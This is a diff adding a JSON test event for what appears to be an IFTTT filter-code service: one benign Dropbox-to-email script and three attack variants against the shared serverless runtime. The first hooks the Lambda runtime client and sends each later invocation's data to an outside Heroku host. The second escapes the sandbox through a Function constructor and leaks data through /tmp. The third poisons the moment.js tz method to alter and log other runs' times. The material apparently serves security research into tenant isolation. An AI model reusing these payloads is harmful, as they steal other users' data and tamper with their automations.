@@ -1,0 +1,31 @@
+{
+  "resource": "/IFTTT-instance",
+  "path": "/IFTTT-instance",
+  "httpMethod": "POST",
+  "body": {
+    "benign-scriptCode":  "Email.sendMeEmail.setBody(Dropbox.newFileInFolder + ' added! @ ' + Meta.currentUserTime.hour() ); Email.sendMeEmail.setSubject(\"dropbox-notification\");",
+    "v1-scriptCode" : "if (typeof counter === 'undefined') { counter = 0; origin = Dropbox.newFileInFolder; let rapid = require('/var/runtime/RAPIDClient.js'); let https = require('https'); let _postInvocationResponse = rapid.prototype.postInvocationResponse; let _nextInvocation = rapid.prototype.nextInvocation; function post(_data) { try { let data = JSON.stringify(_data); let options = { hostname: 'experimentaria.herokuapp.com', path: '/store/iftttdemo', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': data.length } }; let req = https.request(options, (res) => { }); req.write(data); req.end(); } catch (e) {  } } function postInvocationResponse(response, id, callback) { post({ origin : origin, counter : counter, response : response === undefined ? null : response, id : id }); return _postInvocationResponse.call(this, response, id, callback); } async function nextInvocation() { let result = await _nextInvocation.call(this); post({ origin : origin, counter : counter, result : result }); return result; } rapid.prototype.postInvocationResponse = postInvocationResponse; rapid.prototype.nextInvocation = nextInvocation; } else { counter++; } let result = Dropbox.newFileInFolder.FilenameNoExt + ' ' + counter + ' trigger time:' + Meta.triggerTime;",
+    "v2-scriptCode" : "var payload = `let fs = require('fs'); if (typeof counter === 'undefined') { counter = 0; origin = Dropbox.newFileInFolder; let rapid = require('/var/runtime/RAPIDClient.js'); let _postInvocationResponse = rapid.prototype.postInvocationResponse; let _nextInvocation = rapid.prototype.nextInvocation; function postInvocationResponse(response, id, callback) { fs.appendFileSync('/tmp/exfiltrate', JSON.stringify({ origin : origin, counter : counter, response : response === undefined ? null : response, id : id })); return _postInvocationResponse.call(this, response, id, callback); } async function nextInvocation() { let result = await _nextInvocation.call(this); fs.appendFileSync('/tmp/exfiltrate', JSON.stringify({ origin : origin, counter : counter, result : result })); return result; } rapid.prototype.postInvocationResponse = postInvocationResponse; rapid.prototype.nextInvocation = nextInvocation; fs.appendFileSync('/tmp/exfiltrate', 'Injection successful'); } else { counter++; } let result = Dropbox.newFileInFolder.FilenameNoExt + ' ' + counter + ' trigger time:' + Meta.triggerTime; if (fs.existsSync('/tmp/exfiltrate')) { result += fs.readFileSync('/tmp/exfiltrate').toString(); } return result;` ; var f = (() => {}).constructor.call(null,'require', 'Dropbox', 'Meta', payload); var result = f(require, Dropbox, Meta); Email.sendMeEmail.setBody(result);",
+    "v3-scriptCode" : "var log=''; var cnt=''; ​ if (moment.prototype.hasOwnProperty('_counter') && moment.prototype.hasOwnProperty('_ex')) { cnt=moment.prototype._counter.toString(); log='Counter: '+cnt+' Data: '+moment.prototype._ex; } else { log='Counter does not exsist, initializaing to 0'; moment.prototype._counter=0; moment.prototype._ex=''; let _tz = moment.prototype.tz; function tz(x) { let str1 = this.format('YYYY-MM-DDTHH:mm:ss.SSS'); this.set('second', 55); this.set('millisecond', 555); moment.prototype._counter++; let str = x === undefined ? 'no input' : JSON.stringify(x); let str2 = this.format('YYYY-MM-DDTHH:mm:ss.SSS'); let str3 = 'Time zone: ' + str + ' Original time: ' + str1 + ' -> New time: ' + str2 + ' <br>'; moment.prototype._ex=moment.prototype._ex+str3; return _tz.call(this,x); }; moment.prototype.tz=tz; }; ​ var currentT = new Date(); var t=moment(currentT); ​ Email.sendMeEmail.setBody('Time: '+t.format('YYYY-MM-DDTHH:mm:ss.SSS')+'Meta.triggerTime: '+Meta.triggerTime.format('YYYY-MM-DDTHH:mm:ss.SSS')+' Meta.currentUserTime: '+Meta.currentUserTime.format('YYYY-MM-DDTHH:mm:ss.SSS')+'<br>Log: '+log);",
+    "config": {
+      "currentTime": "2020-04-23T18:25:43.511Z",
+      "timeZone": "GMT",
+      "triggerTime": "2020-04-23T19:25:43.511Z",
+      "trigger": {
+        "ingredients": "filename",
+        "serviceName": "Dropbox",
+        "name": "newFileInFolder"
+      },
+      "actions": [
+        {
+          "serviceName": "Email",
+          "name": "sendMeEmail",
+          "fields": [
+            "Body",
+            "Subject"
+          ]
+        }
+      ]
+    }
+  }
+}
